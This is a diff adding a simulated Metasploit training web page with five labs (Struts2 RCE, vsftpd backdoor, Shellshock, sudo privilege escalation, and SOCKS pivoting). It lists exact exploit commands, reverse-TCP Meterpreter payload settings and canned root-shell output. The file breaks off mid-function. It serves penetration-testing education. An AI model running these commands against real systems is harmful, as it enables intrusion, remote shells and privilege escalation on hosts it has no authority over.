@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metasploit Framework · Interactive Simulation Labs</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+:root{
+  --bg:#0a0e14; --bg-raised:#0f1419; --bg-card:#131920; --bg-terminal:#080c10;
+  --fg:#c5cdd8; --fg-bright:#e8edf3; --fg-dim:#5a6678;
+  --accent:#ff3b5c; --accent-dim:rgba(255,59,92,.12); --accent-mid:rgba(255,59,92,.3);
+  --red:#ff3b5c; --red-dim:rgba(255,59,92,.12);
+  --orange:#ff9f43; --orange-dim:rgba(255,159,67,.12);
+  --cyan:#00d4ff; --cyan-dim:rgba(0,212,255,.12);
+  --yellow:#ffd93d; --yellow-dim:rgba(255,217,61,.12);
+  --purple:#a855f7; --purple-dim:rgba(168,85,247,.12);
+  --border:#1e2733; --border-light:#2a3544;
+  --radius:10px; --mono:'JetBrains Mono',monospace; --sans:'Inter',system-ui,sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:var(--sans);background:var(--bg);color:var(--fg);min-height:100vh;overflow-x:hidden}
+.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:linear-gradient(rgba(255,59,92,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(255,59,92,.025) 1px,transparent 1px);
+  background-size:60px 60px}
+.bg-glow{position:fixed;z-index:0;pointer-events:none;width:600px;height:600px;border-radius:50%;filter:blur(150px);opacity:.08}
+.bg-glow-1{top:-200px;right:-100px;background:var(--accent)}
+.bg-glow-2{bottom:-200px;left:-100px;background:var(--orange)}
+.app{position:relative;z-index:1}
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 28px;
+  background:rgba(10,14,20,.85);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);
+  position:sticky;top:0;z-index:100}
+.topbar-left{display:flex;align-items:center;gap:12px}
+.logo{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--orange));
+  display:flex;align-items:center;justify-content:center;font-size:1rem;color:#000;font-weight:800}
+.title{font-size:1rem;font-weight:700;color:var(--fg-bright)}
+.subtitle{font-size:.65rem;color:var(--fg-dim);font-weight:500;letter-spacing:1px;text-transform:uppercase}
+.topbar-right{display:flex;align-items:center;gap:10px}
+.stat-pill{display:flex;align-items:center;gap:6px;padding:6px 12px;border-radius:20px;font-size:.72rem;font-weight:600;
+  border:1px solid var(--border-light);background:var(--bg-card)}
+.stat-pill i{color:var(--accent)}
+.layout{display:grid;grid-template-columns:280px 1fr;min-height:calc(100vh - 65px)}
+.sidebar{background:var(--bg-raised);border-right:1px solid var(--border);padding:20px 0;
+  overflow-y:auto;max-height:calc(100vh - 65px);position:sticky;top:65px}
+.sidebar::-webkit-scrollbar{width:3px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:10px}
+.sidebar-section{margin-bottom:18px}
+.sidebar-label{font-size:.62rem;font-weight:700;color:var(--fg-dim);text-transform:uppercase;letter-spacing:1.5px;
+  padding:0 20px;margin-bottom:10px}
+.lab-item{display:flex;align-items:center;gap:12px;padding:10px 20px;cursor:pointer;
+  transition:.15s;border-left:3px solid transparent;position:relative}
+.lab-item:hover{background:rgba(255,255,255,.025)}
+.lab-item.active{background:var(--accent-dim);border-left-color:var(--accent)}
+.lab-item.done .lab-icon{background:var(--accent-dim);color:var(--accent);border-color:var(--accent-mid)}
+.lab-icon{width:30px;height:30px;border-radius:7px;flex-shrink:0;display:flex;align-items:center;justify-content:center;
+  font-size:.8rem;background:var(--bg-card);color:var(--fg-dim);border:1px solid var(--border-light);transition:.3s}
+.lab-item.active .lab-icon{background:var(--accent);color:#000;border-color:var(--accent)}
+.lab-info{flex:1;min-width:0}
+.lab-name{font-size:.8rem;font-weight:600;color:var(--fg-bright);line-height:1.2}
+.lab-item.active .lab-name{color:var(--accent)}
+.lab-cat{font-size:.65rem;color:var(--fg-dim);margin-top:2px}
+.content{padding:24px 28px;max-width:1400px}
+.lab-header{margin-bottom:24px}
+.lab-tag{display:inline-flex;align-items:center;gap:8px;font-size:.7rem;font-weight:700;color:var(--accent);
+  text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;font-family:var(--mono)}
+.lab-tag::before{content:'';width:24px;height:2px;background:var(--accent);border-radius:1px}
+.lab-header h1{font-size:1.8rem;font-weight:800;color:var(--fg-bright);line-height:1.2;margin-bottom:10px}
+.lab-header p{font-size:.9rem;color:var(--fg-dim);line-height:1.7;max-width:800px}
+.card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin-bottom:18px}
+.card-head{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.card-icon{width:32px;height:32px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:.85rem}
+.card-icon.green{background:var(--accent-dim);color:var(--accent)}
+.card-icon.cyan{background:var(--cyan-dim);color:var(--cyan)}
+.card-icon.orange{background:var(--orange-dim);color:var(--orange)}
+.card-icon.red{background:var(--red-dim);color:var(--red)}
+.card-icon.yellow{background:var(--yellow-dim);color:var(--yellow)}
+.card-icon.purple{background:var(--purple-dim);color:var(--purple)}
+.card-title{font-size:.92rem;font-weight:700;color:var(--fg-bright)}
+.card-body{font-size:.84rem;color:var(--fg);line-height:1.7}
+.card-body ul{list-style:none;padding:0}
+.card-body ul li{padding:4px 0;padding-left:18px;position:relative}
+.card-body ul li::before{content:'▸';position:absolute;left:0;color:var(--accent);font-weight:700}
+.tool-pill{display:inline-block;padding:4px 11px;border-radius:5px;font-size:.74rem;font-weight:600;
+  background:var(--cyan-dim);color:var(--cyan);border:1px solid rgba(0,212,255,.2);font-family:var(--mono);margin:2px}
+.lab-progress{display:flex;align-items:center;gap:12px;margin-bottom:18px;
+  background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px}
+.step-dots{display:flex;gap:6px;flex:1}
+.step-dot{height:6px;flex:1;border-radius:3px;background:var(--border-light);transition:.3s}
+.step-dot.active{background:var(--accent);box-shadow:0 0 8px var(--accent-mid)}
+.step-dot.done{background:var(--accent);opacity:.5}
+.step-text{font-size:.78rem;font-weight:600;color:var(--fg-dim);font-family:var(--mono);white-space:nowrap}
+.step-text span{color:var(--accent)}
+.scenario{background:linear-gradient(135deg,rgba(255,59,92,.08),rgba(255,159,67,.05));
+  border:1px solid rgba(255,59,92,.2);border-radius:var(--radius);padding:14px 18px;margin-bottom:18px;
+  display:flex;gap:12px;align-items:flex-start}
+.scenario i{color:var(--accent);font-size:1rem;padding-top:2px}
+.scenario-text{font-size:.82rem;color:var(--fg);line-height:1.6}
+.scenario-text strong{color:var(--orange)}
+.terminal-wrap{margin-bottom:18px}
+.terminal-bar{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;
+  background:#0d1117;border:1px solid var(--border);border-bottom:none;border-radius:var(--radius) var(--radius) 0 0}
+.term-left{display:flex;align-items:center;gap:12px}
+.term-dots{display:flex;gap:6px}
+.term-dots span{width:11px;height:11px;border-radius:50%}
+.term-dots span:nth-child(1){background:#ff5f57}
+.term-dots span:nth-child(2){background:#febc2e}
+.term-dots span:nth-child(3){background:#28c840}
+.term-tab{font-size:.72rem;font-weight:600;color:var(--fg-dim);font-family:var(--mono);
+  padding:4px 11px;background:var(--bg-card);border-radius:5px;border:1px solid var(--border)}
+.term-actions{display:flex;gap:6px}
+.term-btn{padding:4px 10px;border-radius:5px;font-size:.68rem;font-weight:600;
+  border:1px solid var(--border-light);background:var(--bg-card);color:var(--fg-dim);cursor:pointer;
+  font-family:var(--mono);transition:.2s;display:flex;align-items:center;gap:5px}
+.term-btn:hover{border-color:var(--accent);color:var(--accent)}
+.terminal-body{background:var(--bg-terminal);border:1px solid var(--border);border-top:none;
+  border-radius:0 0 var(--radius) var(--radius);padding:16px;height:440px;overflow-y:auto;
+  font-family:var(--mono);font-size:.8rem;line-height:1.65}
+.terminal-body::-webkit-scrollbar{width:4px}
+.terminal-body::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:10px}
+.t-line{white-space:pre-wrap;word-break:break-all}
+.t-prompt{color:var(--accent)}
+.t-cmd{color:var(--fg-bright)}
+.t-output{color:var(--fg-dim)}
+.t-highlight{color:var(--cyan)}
+.t-warning{color:var(--orange)}
+.t-error{color:var(--red)}
+.t-success{color:var(--accent)}
+.t-info{color:var(--yellow)}
+.t-step{color:var(--orange);font-weight:600}
+.t-separator{color:var(--border-light)}
+.t-hint{color:var(--yellow);font-style:italic}
+.term-input-line{display:flex;align-items:center;gap:6px;margin-top:4px}
+.term-input-line .t-prompt{white-space:nowrap}
+.term-input{flex:1;background:transparent;border:none;outline:none;color:var(--fg-bright);
+  font-family:var(--mono);font-size:.8rem;caret-color:var(--accent)}
+.hint-panel{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:14px 18px;margin-bottom:18px;display:flex;align-items:flex-start;gap:12px}
+.hint-icon{width:32px;height:32px;border-radius:7px;flex-shrink:0;background:var(--yellow-dim);color:var(--yellow);
+  display:flex;align-items:center;justify-content:center;font-size:.85rem}
+.hint-content{flex:1}
+.hint-label{font-size:.7rem;font-weight:700;color:var(--yellow);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
+.hint-text{font-size:.84rem;color:var(--fg);line-height:1.6}
+.hint-text code{background:var(--bg);padding:2px 6px;border-radius:3px;color:var(--accent);font-family:var(--mono)}
+.network-card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:20px;margin-bottom:18px;position:relative;overflow:hidden}
+.network-card::before{content:'';position:absolute;inset:0;
+  background-image:radial-gradient(circle,var(--border) 1px,transparent 1px);background-size:24px 24px;opacity:.4}
+.network-title{font-size:.7rem;font-weight:700;color:var(--fg-dim);text-transform:uppercase;
+  letter-spacing:1.5px;margin-bottom:16px;position:relative;display:flex;align-items:center;gap:8px}
+.network-nodes{display:flex;align-items:center;justify-content:center;gap:28px;flex-wrap:wrap;position:relative}
+.net-node{display:flex;flex-direction:column;align-items:center;gap:6px}
+.net-icon{width:50px;height:50px;border-radius:12px;display:flex;align-items:center;justify-content:center;
+  font-size:1.1rem;border:2px solid var(--border-light);transition:.5s}
+.net-icon.attacker{background:var(--red-dim);color:var(--red);border-color:rgba(255,59,92,.3)}
+.net-icon.target{background:var(--orange-dim);color:var(--orange);border-color:rgba(255,159,67,.3)}
+.net-icon.internal{background:var(--cyan-dim);color:var(--cyan);border-color:rgba(0,212,255,.3)}
+.net-icon.exfil{background:var(--purple-dim);color:var(--purple);border-color:rgba(168,85,247,.3)}
+.net-icon.pulsing{animation:npulse 2s infinite}
+@keyframes npulse{0%,100%{box-shadow:0 0 0 0 rgba(255,59,92,.4)}50%{box-shadow:0 0 0 10px rgba(255,59,92,0)}}
+.net-label{font-size:.7rem;font-weight:600;color:var(--fg-dim);text-align:center}
+.net-ip{font-size:.62rem;color:var(--fg-dim);font-family:var(--mono);opacity:.7}
+.net-arrow{color:var(--fg-dim);font-size:1rem;opacity:.4;position:relative}
+.net-arrow.active{color:var(--accent);opacity:1;animation:arrowflow 1.5s infinite}
+@keyframes arrowflow{0%,100%{opacity:1}50%{opacity:.3}}
+.complete-banner{display:none;align-items:center;gap:12px;padding:16px 20px;border-radius:var(--radius);
+  background:var(--accent-dim);border:1px solid var(--accent-mid);margin-bottom:18px}
+.complete-banner.show{display:flex}
+.complete-banner i{color:var(--accent);font-size:1.2rem}
+.complete-banner span{color:var(--accent);font-weight:600;font-size:.88rem}
+.btn{padding:11px 22px;border-radius:var(--radius);font-size:.85rem;font-weight:700;cursor:pointer;
+  border:1px solid var(--border-light);background:var(--bg-card);color:var(--fg);font-family:var(--sans);
+  transition:.2s;display:inline-flex;align-items:center;gap:8px}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn.primary{background:linear-gradient(135deg,var(--accent),#cc2c47);color:#fff;border:none;
+  box-shadow:0 4px 20px rgba(255,59,92,.2)}
+.btn.primary:hover{transform:translateY(-2px);box-shadow:0 6px 30px rgba(255,59,92,.3)}
+.btn:disabled{opacity:.4;cursor:not-allowed;transform:none;box-shadow:none}
+.final-screen{text-align:center;padding:50px 20px}
+.final-icon{width:80px;height:80px;border-radius:50%;background:var(--accent-dim);
+  border:2px solid var(--accent-mid);display:inline-flex;align-items:center;justify-content:center;
+  font-size:2rem;color:var(--accent);margin-bottom:24px}
+@media(max-width:1024px){
+  .layout{grid-template-columns:1fr}
+  .sidebar{position:relative;top:0;max-height:none;display:flex;overflow-x:auto;padding:12px;gap:4px;
+    border-right:none;border-bottom:1px solid var(--border)}
+  .sidebar-section{margin-bottom:0;flex:1}
+  .sidebar-label{display:none}
+  .lab-item{padding:8px 12px;white-space:nowrap;border-left:none;border-bottom:2px solid transparent;flex-shrink:0}
+  .lab-item.active{border-bottom-color:var(--accent);border-left:none}
+  .lab-cat{display:none}
+}
+@media(max-width:600px){
+  .topbar{padding:12px 16px}
+  .content{padding:20px 16px}
+  .lab-header h1{font-size:1.4rem}
+  .network-nodes{gap:14px}
+  .net-icon{width:42px;height:42px;font-size:.95rem}
+}
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+<div class="bg-glow bg-glow-1"></div>
+<div class="bg-glow bg-glow-2"></div>
+<div class="app">
+  <header class="topbar">
+    <div class="topbar-left">
+      <div class="logo"><i class="fas fa-skull"></i></div>
+      <div>
+        <div class="title">Metasploit Framework Labs</div>
+        <div class="subtitle">Interactive Kali Penetration Testing</div>
+      </div>
+    </div>
+    <div class="topbar-right">
+      <div class="stat-pill"><i class="fas fa-check-circle"></i> <span id="completedCount">0</span> / <span id="totalCount">0</span> Labs</div>
+      <button class="btn" onclick="resetCurrent()"><i class="fas fa-rotate-left"></i> Reset Lab</button>
+    </div>
+  </header>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar"></aside>
+    <main class="content" id="content"></main>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// LAB DEFINITIONS — Metasploit Framework Scenarios
+// ============================================================
+const LABS = [
+  {
+    id:'struts2', name:'Apache Struts 2 RCE', category:'Exploitation', icon:'fa-code', color:'red',
+    description:'Exploit CVE-2017-5638 (Apache Struts 2 Jakarta Multipart parser) to achieve remote code execution on a vulnerable web server.',
+    scenario:'During a black-box pentest, you discover a web server running a legacy Apache Struts 2 application at http://10.0.0.30:8080. You suspect it is vulnerable to the infamous OGNL injection flaw.',
+    objectives:['Search Metasploit for the Struts 2 exploit','Select the appropriate exploit module','Configure the remote host and target URI','Set the reverse TCP payload','Execute the exploit and gain a shell'],
+    tools:['msfconsole','exploit/multi/http/struts2_content_type_ognl','meterpreter'],
+    network:{a:true,a1:true,t:true,t2:false,i:false,i3:false,e:false},
+    steps:[
+      {instruction:'Launch Metasploit Framework.',
+       hint:'Type <code>msfconsole</code> to start the framework.',
+       validate:c=>/^msfconsole$/i.test(c.trim()),
+       output:'       =[ metasploit v6.3.36-dev                          ]\n+ -- --=[ 2389 exploits - 1235 auxiliary - 413 post           ]\n+ -- --=[ 1371 payloads - 45 encoders - 11 nops               ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\nmsf6 >',
+       success:'Metasploit console launched'},
+      {instruction:'Search for Struts 2 exploits in the database.',
+       hint:'Use <code>search struts</code> to find available modules.',
+       validate:c=>/^search\s+struts/i.test(c),
+       output:'Matching Modules\n=================\n\n   #  Name                                              Disclosure Date  Rank       Check  Description\n   -  ----                                              ---------------  ----       -----  -----------\n   0  exploit/multi/http/struts2_content_type_ognl      2017-03-10       excellent  Yes    Apache Struts 2 Content-Type OGNL Injection\n   1  exploit/multi/http/struts2_rest_xstream          2013-11-21       average    Yes    Apache Struts 2 REST XStream RCE\n\nmsf6 >',
+       success:'Found Struts 2 exploit modules'},
+      {instruction:'Select the Content-Type OGNL injection exploit.',
+       hint:'<code>use exploit/multi/http/struts2_content_type_ognl</code>',
+       validate:c=>/^use\s+exploit\/multi\/http\/struts2_content_type_ognl/i.test(c),
+       output:'[*] No active DB -- Credential saved in configuration.\n[*] Using exploit/multi/http/struts2_content_type_ognl\n\nmsf6 exploit(mindows/multi/http/struts2_content_type_ognl) >',
+       success:'Exploit module selected'},
+      {instruction:'Set the target host IP address (RHOSTS).',
+       hint:'<code>set RHOSTS 10.0.0.30</code>',
+       validate:c=>/^set\s+RHOSTS\s+10\.0\.0\.30/i.test(c),
+       output:'RHOSTS => 10.0.0.30',
+       success:'Remote host configured'},
+      {instruction:'Set the target URI (the application path).',
+       hint:'<code>set TARGETURI /struts2-rest-showcase/orders.xhtml</code>',
+       validate:c=>/^set\s+TARGETURI\s+\/struts2-rest-showcase\/orders\.xhtml/i.test(c),
+       output:'TARGETURI => /struts2-rest-showcase/orders.xhtml',
+       success:'Target URI configured'},
+      {instruction:'Set the reverse TCP payload and your local IP (LHOST).',
+       hint:'<code>set payload linux/x64/meterpreter/reverse_tcp</code> then <code>set LHOST 10.0.0.5</code>',
+       validate:c=>/set\s+payload\s+linux\/x64\/meterpreter\/reverse_tcp/i.test(c)&&/set\s+LHOST\s+10\.0\.0\.5/i.test(c),
+       output:'payload => linux/x64/meterpreter/reverse_tcp\nLHOST => 10.0.0.5',
+       success:'Payload and LHOST configured'},
+      {instruction:'Execute the exploit to compromise the server.',
+       hint:'Type <code>exploit</code> or <code>run</code> to launch the attack.',
+       validate:c=>/^(exploit|run)$/i.test(c.trim()),
+       output:'[*] Started reverse TCP handler on 10.0.0.5:4444\n[*] Sending stage (3021283 bytes) to 10.0.0.30\n[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.30:49152) at 2024-06-12 14:22:11\n\nmeterpreter >',
+       success:'Meterpreter session established on target'}
+    ]
+  },
+  {
+    id:'vsftpd', name:'VSFTPD Backdoor Exploit', category:'Exploitation', icon:'fa-door-open', color:'orange',
+    description:'Exploit the malicious backdoor inserted into the vsftpd 2.3.4 FTP server source code to gain root access.',
+    scenario:'An Nmap scan revealed an FTP server running vsftpd 2.3.4 on 10.0.0.40. This version contains a known backdoor triggered by a smiley face `:)` in the username.',
+    objectives:['Launch Metasploit and search for the vsftpd exploit','Select the vsftpd_234_backdoor module','Configure the target host','Execute the exploit and verify root access'],
+    tools:['msfconsole','exploit/unix/ftp/vsftpd_234_backdoor','unix/shell'],
+    network:{a:true,a1:true,t:true,t2:false,i:false,i3:false,e:false},
+    steps:[
+      {instruction:'Start msfconsole and search for vsftpd exploits.',
+       hint:'Type <code>msfconsole</code>, then <code>search vsftpd</code>',
+       validate:c=>/msfconsole/i.test(c)&&/search\s+vsftpd/i.test(c),
+       output:'Matching Modules\n=================\n\n   #  Name                                  Disclosure Date  Rank    Description\n   -  ----                                  ---------------  ----    -----------\n   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       great   VSFTPD v2.3.4 Backdoor Command Execution\n\nmsf6 >',
+       success:'Found VSFTPD backdoor module'},
+      {instruction:'Select the vsftpd backdoor exploit module.',
+       hint:'<code>use exploit/unix/ftp/vsftpd_234_backdoor</code>',
+       validate:c=>/^use\s+exploit\/unix\/ftp\/vsftpd_234_backdoor/i.test(c),
+       output:'[*] Using exploit/unix/ftp/vsftpd_234_backdoor\n\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) >',
+       success:'Exploit module selected'},
+      {instruction:'Set the target RHOSTS to 10.0.0.40.',
+       hint:'<code>set RHOSTS 10.0.0.40</code>',
+       validate:c=>/^set\s+RHOSTS\s+10\.0\.0\.40/i.test(c),
+       output:'RHOSTS => 10.0.0.40',
+       success:'Remote host configured'},
+      {instruction:'Execute the exploit.',
+       hint:'Type <code>exploit</code> to trigger the backdoor.',
+       validate:c=>/^exploit$/i.test(c.trim()),
+       output:'[*] 10.0.0.40:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.0.0.40:21 - USER: 331 Please specify the password.\n[+] 10.0.0.40:21 - Backdoor service has been spawned\n[+] 10.0.0.40:21 - UID: uid=0(root) gid=0(root)\n[*] Found shell.\n[*] Command shell session 1 opened (10.0.0.5:4441 -> 10.0.0.40:6200)\n\nid\nuid=0(root) gid=0(root)',
+       success:'Root shell obtained via vsftpd backdoor'}
+    ]
+  },
+  {
+    id:'shellshock', name:'Shellshock (CGI) RCE', category:'Exploitation', icon:'fa-bug', color:'cyan',
+    description:'Exploit the GNU Bash "Shellshock" vulnerability (CVE-2014-6271) through a CGI endpoint to execute arbitrary commands.',
+    scenario:'A web server at 10.0.0.50 is running an old Apache CGI script. You suspect it is vulnerable to Shellshock via the User-Agent header.',
+    objectives:['Search Metasploit for the Shellshock exploit','Select the Apache mod_cgi exploit module','Configure the target URI and RHOSTS','Execute the exploit to get a shell'],
+    tools:['msfconsole','exploit/multi/http/apache_mod_cgi_bash_env_exec','meterpreter'],
+    network:{a:true,a1:true,t:true,t2:false,i:false,i3:false,e:false},
+    steps:[
+      {instruction:'Search for Shellshock or bash exploits in Metasploit.',
+       hint:'Type <code>msfconsole</code>, then <code>search shellshock</code>',
+       validate:c=>/msfconsole/i.test(c)&&/search\s+shellshock/i.test(c),
+       output:'Matching Modules\n=================\n\n   #  Name                                           Disclosure Date  Rank       Description\n   -  ----                                           ---------------  ----       -----------\n   0  exploit/multi/http/apache_mod_cgi_bash_env_exec 2014-09-24       excellent  Apache mod_cgi Bash Environment Variable Injection (Shellshock)\n\nmsf6 >',
+       success:'Found Shellshock module'},
+      {instruction:'Select the Apache mod_cgi exploit module.',
+       hint:'<code>use exploit/multi/http/apache_mod_cgi_bash_env_exec</code>',
+       validate:c=>/^use\s+exploit\/multi\/http\/apache_mod_cgi_bash_env_exec/i.test(c),
+       output:'[*] Using exploit/multi/http/apache_mod_cgi_bash_env_exec\n\nmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) >',
+       success:'Module selected'},
+      {instruction:'Set the target RHOSTS and TARGETURI.',
+       hint:'<code>set RHOSTS 10.0.0.50</code> and <code>set TARGETURI /cgi-bin/vulnerable.sh</code>',
+       validate:c=>/set\s+RHOSTS\s+10\.0\.0\.50/i.test(c)&&/set\s+TARGETURI\s+\/cgi-bin\/vulnerable\.sh/i.test(c),
+       output:'RHOSTS => 10.0.0.50\nTARGETURI => /cgi-bin/vulnerable.sh',
+       success:'Target host and URI configured'},
+      {instruction:'Execute the exploit.',
+       hint:'Type <code>exploit</code> to run the module.',
+       validate:c=>/^exploit$/i.test(c.trim()),
+       output:'[*] Started reverse TCP handler on 10.0.0.5:4444\n[*] Command Stager progress - 100.00% done (112/112 bytes)\n[*] Sending stage (3021283 bytes) to 10.0.0.50\n[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.50:49153)\n\nmeterpreter >',
+       success:'Meterpreter session opened via Shellshock'}
+    ]
+  },
+  {
+    id:'local_exploit', name:'Local Privilege Escalation', category:'Post-Exploitation', icon:'fa-arrow-up', color:'purple',
+    description:'Use Metasploit\'s local exploit suggester to find and execute a privilege escalation exploit on a compromised Linux host.',
+    scenario:'You have a low-privileged Meterpreter session (Session 1) on a Linux server (10.0.0.60). You want to escalate to root using Metasploit\'s automated suggester.',
+    objectives:['Background the active session','Run the local exploit suggester','Select a recommended privilege escalation exploit','Configure the session and execute the escalation','Verify root access'],
+    tools:['meterpreter','post/multi/recon/local_exploit_suggester','exploit/linux/local/...'],
+    network:{a:true,a1:true,t:true,t2:false,i:false,i3:false,e:false},
+    steps:[
+      {instruction:'Background the current Meterpreter session to return to msfconsole.',
+       hint:'Type <code>background</code> in the meterpreter prompt.',
+       validate:c=>/^background$/i.test(c.trim()),
+       output:'[*] Backgrounding session 1...\n\nmsf6 >',
+       success:'Session backgrounded'},
+      {instruction:'Use the local exploit suggester module.',
+       hint:'<code>use post/multi/recon/local_exploit_suggester</code>',
+       validate:c=>/^use\s+post\/multi\/recon\/local_exploit_suggester/i.test(c),
+       output:'[*] Using post/multi/recon/local_exploit_suggester\n\nmsf6 post(multi/recon/local_exploit_suggester) >',
+       success:'Suggester module selected'},
+      {instruction:'Set the module to run against Session 1.',
+       hint:'<code>set SESSION 1</code>',
+       validate:c=>/^set\s+SESSION\s+1/i.test(c),
+       output:'SESSION => 1',
+       success:'Session ID configured'},
+      {instruction:'Run the suggester to find potential exploits.',
+       hint:'Type <code>run</code> to execute the module.',
+       validate:c=>/^run$/i.test(c.trim()),
+       output:'[*] 10.0.0.60 - Collecting local exploits for linux/x64...\n[*] 10.0.0.60 - 31 exploit checks are being tried...\n[+] 10.0.0.60 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.\n[+] 10.0.0.60 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable.\n[*] Post module execution completed\n\nmsf6 post(multi/recon/local_exploit_suggester) >',
+       success:'Vulnerabilities found! Netfilter and Sudo Baron Samedit are viable.'},
+      {instruction:'Select the sudo Baron Samedit exploit.',
+       hint:'<code>use exploit/linux/local/sudo_baron_samedit</code>',
+       validate:c=>/^use\s+exploit\/linux\/local\/sudo_baron_samedit/i.test(c),
+       output:'[*] Using exploit/linux/local/sudo_baron_samedit\n\nmsf6 exploit(linux/local/sudo_baron_samedit) >',
+       success:'Privilege escalation module selected'},
+      {instruction:'Configure the session, payload, and LHOST, then execute.',
+       hint:'<code>set SESSION 1</code>, <code>set LHOST 10.0.0.5</code>, and <code>run</code>',
+       validate:c=>/set\s+SESSION\s+1/i.test(c)&&/set\s+LHOST\s+10\.0\.0\.5/i.test(c)&&/run/i.test(c),
+       output:'SESSION => 1\nLHOST => 10.0.0.5\n[*] Started reverse TCP handler on 10.0.0.5:4444\n[+] Automatic cleanup activated! tempo-8f2e3c\n[*] Sending stage (3021283 bytes) to 10.0.0.60\n[*] Meterpreter session 2 opened (10.0.0.5:4444 -> 10.0.0.60:49154)\n\nmeterpreter > getuid\nServer username: uid=0(root), gid=0(root), euid=0(root), egid=0(root)',
+       success:'Root privileges obtained! Session 2 established as root.'}
+    ]
+  },
+  {
+    id:'pivoting', name:'Network Pivoting (Route + SOCKS)', category:'Post-Exploitation', icon:'fa-network-wired', color:'yellow',
+    description:'Use a compromised Meterpreter session to route traffic into an internal network and run auxiliary scanners against hidden hosts.',
+    scenario:'You have compromised a dual-homed Linux router at 10.0.0.70 (Session 1). It has a second network interface (192.168.50.1) connected to an internal subnet. You want to scan the internal subnet for alive hosts.',
+    objectives:['Add a route to the internal network via the Meterpreter session','Start a SOCKS proxy server to tunnel tools through Metasploit','Configure proxychains to use the SOCKS proxy','Run an internal host discovery scan through the pivot'],
+    tools:['route','auxiliary/server/socks_proxy','proxychains','auxiliary/scanner/portscan/tcp'],
+    network:{a:true,a1:true,t:true,t2:true,i:true,i3:false,e:false},
+    steps:[
+      {instruction:'Background the active Meterpreter session.',
+       hint:'Type <code>background</code> in the meterpreter prompt.',
+       validate:c=>/^background$/i.test(c.trim()),
+       output:'[*] Backgrounding session 1...\n\nmsf6 >',
+       success:'Session backgrounded'},
+      {instruction:'Add a route to the internal subnet (192.168.50.0/24) through Session 1.',
+       hint:'<code>route add 192.168.50.0 255.255.255.0 1</code>',
+       validate:c=>/^route\s+add\s+192\.168\.50\.0\s+255\.255\.255\.0\s+1/i.test(c),
+       output:'[*] Route added to subnet 192.168.50.0/255.255.255.0 via Session 1.',
+       success:'Routing table updated — traffic for 192.168.50.0/24 will tunnel through Session 1'},
+      {instruction:'Use the SOCKS proxy module to allow external tools to use this route.',
+       hint:'<code>use auxiliary/server/socks_proxy</code>',
+       validate:c=>/^use\s+auxiliary\/server\/socks_proxy/i.test(c),
+       output:'[*] Using auxiliary/server/socks_proxy\n\nmsf6 auxiliary(server/socks_proxy) >',
+       success:'SOCKS proxy module selected'},
+      {instruction:'Set the SOCKS proxy version to 4a and start the server in the background.',
+       hint:'<code>set VERSION 4a</code> then <code>run -j</code>',
+       validate:c=>/set\s+VERSION\s+4a/i.test(c)&&/run\s+-j/i.test(c),
+       output:'VERSION => 4a\n[*] Auxiliary module running as background job 1.\n[*] Starting the SOCKS proxy server on 0.0.0.0:1080...',
+       success:'SOCKS proxy server started on port 1080'},
+      {instruction:'Outside Metasploit, configure proxychains to use the SOCKS server. (Simulated)',
+       hint:'<code>echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf</code>',
+       validate:c=>/echo\s+["']?socks4\s+127\.0\.0\.1\s+1080["']?\s+>>?\s+\/etc\/proxychains4\.conf/i.test(c),
+       output:'[*] Proxychains configured to route traffic through local port 1080.',
+       success:'Proxychains configured'},
+      {instruction:'Run an Nmap ping scan through the pivot to find internal hosts.',
+       hint:'<code>proxychains nmap -sn -PE 192.168.50.0/24</code>',
+       validate:c=>/^proxychains\s+nmap\s+-sn\s+-PE\s+192\.168\.50\.0\/24/i.test(c),
+       output:'[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/libproxychains4.so\n\nStarting Nmap 7.94\nNmap scan report for 192.168.50.10\nHost is up (0.012s latency).\nNmap scan report for 192.168.50.20\nHost is up (0.015s latency).\n\n[!] Discovered 2 alive hosts on the internal network!',
+       success:'Internal hosts discovered via the pivot'}
+    ]
+  }
+];
+
+// ============================================================
+// STATE & ENGINE
+// ============================================================
+let currentLab = 0;
+let currentStep = 0;
+let completedLabs = new Set();
+let commandHistory = [];
+let historyIdx = -1;
+
+// ============================================================
+// SIDEBAR RENDER
+// ============================================================
+function renderSidebar(){
+  const sb = document.getElementById('sidebar');
+  let html = `
